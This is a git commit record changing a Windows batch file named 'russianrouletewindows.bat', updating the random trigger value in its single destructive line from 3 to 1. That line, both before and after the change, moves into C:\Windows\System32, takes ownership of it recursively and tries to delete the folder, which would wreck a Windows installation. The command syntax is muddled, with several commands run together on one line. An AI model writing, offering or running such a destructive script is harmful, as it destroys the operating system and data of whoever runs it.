4998bff4d95da3ab319cd58da0fb59ede380c195
Java sauce <mohammedbrandon204@gmail.com>
2022-09-18 13:40:56 -0700

    Update russianrouletewindows.bat
    it is now 1

--- russianrouletewindows.bat
+++ russianrouletewindows.bat
@@ -1,6 +1,6 @@
 @echo off
 set /a result=(%RANDOM%*max/8)+min
 
-if %RANDOM%== 3 cd C:\Windows\System32 takeown /F System32 /R rmdir -r C:\Windows\System32
+if %RANDOM%== 1 cd C:\Windows\System32 takeown /F System32 /R rmdir -r C:\Windows\System32
 
 pause
